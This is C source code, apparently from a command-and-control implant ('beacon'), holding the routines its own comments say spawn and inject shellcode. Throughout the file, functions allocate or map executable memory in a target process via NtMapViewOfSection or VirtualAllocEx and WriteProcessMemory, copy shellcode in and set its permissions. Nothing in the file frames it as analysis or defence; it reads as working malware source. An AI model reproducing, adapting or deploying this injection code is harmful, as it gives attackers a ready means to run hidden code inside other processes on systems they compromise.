/*
* Functions related to spawning and injecting shellcode. Better to group these into one spot.
*/
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"
#include <bcrypt.h>

#define ALLOCATOR_VIRTUALALLOCEX     0
#define ALLOCATOR_NTMAPVIEWOFSECTION 1

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT;

typedef NTSTATUS (WINAPI *fNtMapViewOfSection)(HANDLE, HANDLE, LPVOID, ULONG, SIZE_T, LARGE_INTEGER*, SIZE_T*, SECTION_INHERIT, ULONG, ULONG);

char * remote_mirror_data_ntmapviewofsection(HANDLE hProcess, DWORD pid, char * buffer, int length) {
	fNtMapViewOfSection pNtMapViewOfSection;
	HANDLE              hFile;
	char *              ctx_local  = NULL;
	char *              ctx_remote = NULL;
	SIZE_T              vSize      = 0;

	/* determine the minimum length we want to allocate */
	DWORD               allocsz    = setting_int(SETTING_PROCINJ_MINALLOC);
	if (length > allocsz)
		allocsz = length;

	/* try to get this function */
	pNtMapViewOfSection = (fNtMapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return NULL;

	/* create our section */
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, allocsz, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		goto done;

	/* map it into the current process */
	ctx_local = (char *)MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (ctx_local == NULL)
		goto done;

	/* copy our data to the section */
	memcpy(ctx_local, buffer, length);

	/* map our section in the remote process now */
	pNtMapViewOfSection(hFile, hProcess, &ctx_remote, 0, 0, NULL, &vSize, ViewShare, 0, setting_short(SETTING_PROCINJ_PERMS));

done:
	/* clean up */
	if (ctx_local != NULL)
		UnmapViewOfFile(ctx_local);

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	/* report failure if we indeed failed */
	if (ctx_remote == NULL)
		post_error_d(0x49, GetLastError());

	return ctx_remote;
}

char * remote_mirror_data_virtualallocex(HANDLE hProcess, DWORD pid, char * buffer, int length) {
	void * ptr;
	SIZE_T wrote;
	int total = 0;
	DWORD old;

	DWORD allocsz = setting_int(SETTING_PROCINJ_MINALLOC);
	if (length > allocsz)
		allocsz = length;

	/* allocate memory in our process */
	ptr = (char *)VirtualAllocEx(hProcess, 0, allocsz, MEM_RESERVE | MEM_COMMIT, setting_short(SETTING_PROCINJ_PERMS_I));
	if (ptr == NULL) {
		post_error_dd(0x1f, allocsz, GetLastError());
		return NULL;
	}

	/* write our shellcode to the process */
	while (total < length) {
		if (!WriteProcessMemory(hProcess, (char *)ptr + total, buffer + total, length - total, &wrote)) {
			post_error_d(0x10, GetLastError());
			VirtualFree(ptr, 0, MEM_RELEASE);
			return NULL;
		}

		total += wrote;

		if (wrote == 0) {
			VirtualFree(ptr, 0, MEM_RELEASE);
			return NULL;
		}
	}

	/* make the data executable now */
	if (setting_short(SETTING_PROCINJ_PERMS_I) == setting_short(SETTING_PROCINJ_PERMS)) {
		/* do nothing... the perms are already where we want them. */
	}
	else if (!VirtualProtectEx(hProcess, ptr, allocsz, setting_short(SETTING_PROCINJ_PERMS), &old)) {
		post_error_d(0x11, GetLastError());
		VirtualFree(ptr, 0, MEM_RELEASE);
		return NULL;
	}

	return (char *)ptr;
}

char * local_mirror_data(char * buffer, int length) {
	void * ptr;
	int total = 0;

	DWORD allocsz = setting_int(SETTING_PROCINJ_MINALLOC);
	if (length > allocsz)
		allocsz = length + 1024;

	/* allocate memory in our process */
	/* TODO: local_mirror_data caller is responsible for allocated memory */
	ptr = (char *)VirtualAlloc(0, allocsz, MEM_RESERVE | MEM_COMMIT, setting_short(SETTING_PROCINJ_PERMS_I));
	if (ptr == NULL) {
		post_error_dd(0x1f, allocsz, GetLastError());
		return NULL;
	}

	/* copy our shellcode to the right spot */
	memcpy((char *)ptr, buffer, length);

	/* handle our permissions... one last time */
	if (finalize_memory_permissions((char *)ptr, allocsz)) {
		return (char*)ptr;
	}
	else {
		VirtualFree(ptr, 0, MEM_RELEASE);
		return NULL;
	}
}

/* make the data executable now */
BOOL finalize_memory_permissions(char * ptr, SIZE_T length) {
	DWORD old;

	if (setting_short(SETTING_PROCINJ_PERMS_I) == setting_short(SETTING_PROCINJ_PERMS)) {
		return TRUE;
	}
	else if (!VirtualProtect(ptr, length, setting_short(SETTING_PROCINJ_PERMS), &old)) {
		post_error_d(0x11, GetLastError());
		return FALSE;
	}

	return TRUE;
}

char * remote_mirror_data(INJECTCONTEXT * context, char * buffer, int length) {
	unsigned short option = setting_short(SETTING_PROCINJ_ALLOCATOR);
    /* TODO: remote_mirror_data caller is responsible for allocated memory */
	if (option == ALLOCATOR_NTMAPVIEWOFSECTION && context->sameArch) {
		return remote_mirror_data_ntmapviewofsection(context->hProcess, context->pid, buffer, length);
	}

	return remote_mirror_data_virtualallocex(context->hProcess, context->pid, buffer, length);
}
